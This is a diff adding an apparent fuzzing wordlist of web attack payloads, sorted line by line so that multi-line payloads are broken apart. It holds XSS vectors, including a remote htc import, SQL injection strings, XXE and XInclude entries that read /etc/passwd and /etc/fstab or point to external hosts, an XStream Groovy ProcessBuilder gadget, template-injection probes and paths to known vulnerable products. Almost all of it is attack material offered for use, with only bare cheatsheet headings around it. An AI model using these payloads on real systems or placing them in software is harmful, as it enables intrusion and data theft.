@@ -1,0 +1,157 @@
+"<xml SRC=""xsstest.xml"" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
+"}}</script>'
+$
+&apos;XoiZR
+&foo;
+&lt;? Tnn96 ?&gt;
+&lt;?Tnn96 ?&gt;
+&lt;Tnn96&gt;
+&quot;XoiZR
+&xxe;
+' or ''='
+' or '1'='1
+'}}</script>"
+'}}</script>'
+*
+** Credit | XSS.Cx
+*/*
++
+-
+--------------
+---------------------------
+---------------------------------------------------------------
+------------------------------------------------------------------
+-----------------------------------------------------------------------
+-1
+/
+//
+//*
+/?layout=/etc/passwd
+/api/agent/tabs/agentData
+/cmisatom/cmis-online/query
+/geoserver/ows?service=WFS
+/geoserver/ows?service=WFS&request=GetCapabilities
+/geoserver/wfs?service=WFS
+/geoserver/wfs?service=WFS&request=GetCapabilities
+/geoserver/wfs?service=WMS&request=GetMap
+/jira/secure/Dashboard.jspa
+/login.jsp
+/meaweb/os/mxperson
+/opencms/cmisatom/cmis-online/query
+/os/mxperson
+/ows?service=WFS
+/ows?service=WFS&request=GetCapabilities
+/secure/Dashboard.jspa
+/v2/api/product/manger/getInfo
+/wfs?service=WFS
+/wfs?service=WFS&request=GetCapabilities
+/wfs?service=WMS&request=GetMap
+0
+0.1
+0.9
+1
+5e-10
+:
+;
+</command>
+</entry>
+</expandoProperties>
+</g>
+</groovy.util.Expando>
+</madeuptag>
+</map>
+</org.codehaus.groovy.runtime.MethodClosure>
+</owner>
+</roottag>
+</svg>
+</text>
+</xsl:stylesheet>
+</xsl:template>
+<?xml version="1.0" ?>
+<?xml version="1.0" encoding="UTF-7" ?>
+<?xml version="1.0" encoding="UTF-8"?>
+<?xml version="1.0" encoding="utf-8"?>
+<?xml version="1.0" standalone="no"?>
+<?xml version="1.0" standalone="yes"?>
+<?xml version="1.0"?>
+<?xml version="1.0"?><change-log><text>&quot;Hello World&quot;</text></change-log>
+<?xml version="1.0"?><change-log><text>Hello World</text></change-log>
+<?xml-stylesheet href="http://xxe-xml-stylesheet.yourdomain[.]com/"?><x />
+<?xml-stylesheet type="text/xml" href="#mytest"?>
+<?xml-stylesheet type="text/xml" href="http://[IP]"?>
+<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc">
+<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<a>&rrr;</a>
+<change-log> <text>&systemEntity;</text> </change-log>
+<command>
+<data>&file;</data>
+<delegate class="groovy.util.Expando" reference="../../../.."/>
+<directive>0</directive>
+<document xmlns:xi="http://<IP>/XInclude"><footer><xi:include href="title.xml"/></footer></document>
+<entry>
+<expandoProperties>
+<fo:block font-weight="bold"><xsl:apply-templates/></fo:block>
+<g>
+<groovy.util.Expando>
+<int>1</int>
+<madeuptag xlmns="http://[ip]" xsi:schemaLocation="http://[IP]">
+<map>
+<maximumNumberOfParameters>0</maximumNumberOfParameters>
+<method>start</method>
+<org.codehaus.groovy.runtime.MethodClosure>
+<owner class="java.lang.ProcessBuilder">
+<parameterTypes/>
+<r>&exfil;</r>
+<r>&sp;</r>
+<r></r>
+<redirectErrorStream>false</redirectErrorStream>
+<resolveStrategy>0</resolveStrategy>
+<root>&all;</root>
+<roottag>
+<sometag>&windowsfile;</sometag>
+<string>/Applications/Calculator.app</string>
+<string>hashCode</string>
+<string>open</string>
+<test></test>
+<xi:include href="file:///etc/fstab" parse="text"/>
+<xml SRC="xsstest.xml" ID=I></xml>
+<xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<xsl:import href="http://[ip]"/>
+@
+@*
+Access to the path 'c:\windows\system32\inetsrv' is denied.
+Application Request Contains:
+Application Response Contains:
+Combined Entity and Parameter Entity:
+FTP
+File-not-found exception based extraction
+Inline XSLT:
+Inside SOAP body
+OoB extra ERROR -- Java
+OoB extra nice
+OoB extraction
+Other Signatures:
+Suggestion: Stop and Send in a Bug Report
+That means you've successfully confirmed XXE on Windows
+Untested - WAF Bypass
+Vanilla entity test:
+Windows XXE Smoke Test PoC
+XInclude:
+XML Entity Cheatsheet - Updated
+XML Headers:
+XML Schema Inline:
+[Tnn96]
+]>
+false
+null
+true
+x' or 1=1 or 'x'='y
+{= Tnn96}
+{Tnn96}
+{{= Tnn96}}
+{{Tnn96}}
+}}</script>""'"
+}}</script>'
+}}</script>'"
+‘
+“
